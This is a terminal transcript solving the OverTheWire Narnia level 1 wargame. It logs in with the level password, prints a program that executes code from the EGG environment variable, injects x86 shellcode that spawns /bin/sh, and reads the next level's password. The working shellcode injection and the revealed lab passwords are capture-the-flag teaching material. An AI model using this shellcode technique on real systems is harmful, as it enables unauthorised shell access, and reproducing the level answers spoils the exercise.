Terminal  
===  
```  
ssh narnia1@narnia.labs.overthewire.org  
narnia1@narnia.labs.overthewire.org's password: efeidiedae <enter>  
narnia1@melinda:~$ cd /narnia
narnia1@melinda:/narnia$ cat narnia1.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}  
narnia1@melinda:/narnia$ export EGG=$(python -c'print "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!  
$ whoami
narnia2  
$ cat /etc/narnia_pass/narnia2
nairiepecu  

```
